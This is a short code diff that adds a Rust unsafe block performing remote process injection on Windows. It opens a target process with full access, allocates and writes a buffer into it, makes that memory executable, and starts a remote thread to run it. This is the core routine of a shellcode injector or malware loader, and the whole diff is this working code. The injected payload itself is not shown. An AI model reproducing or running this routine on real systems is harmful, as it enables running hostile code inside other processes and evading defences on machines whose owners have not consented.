@@ -1,0 +1,15 @@
+    unsafe {
+        let hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, *tar).unwrap();
+        let resultPtr = VirtualAllocEx(hProcess, null(), buf.len(), MEM_COMMIT, PAGE_READWRITE);
+        let mut byteswritten = 0;
+        let resultBool:BOOL = WriteProcessMemory(hProcess, resultPtr, buf.as_ptr() as _, buf.len(), &mut byteswritten);
+        println!("WriteProcess {:?}", resultBool);
+        let mut old_perms = PAGE_EXECUTE_READ;
+        if !VirtualProtectEx(hProcess, resultPtr, buf.len(), PAGE_EXECUTE_READ, &mut old_perms,).as_bool()
+        {
+            let last_error = GetLastError();
+            eprintln!("VirtualProtectEx err");
+            println!("{:?}", last_error);
+        }
+        let _resCRT = CreateRemoteThread(hProcess, null(), 0, Some(std::mem::transmute(resultPtr)), null(), 0, null_mut()).unwrap();
+    }
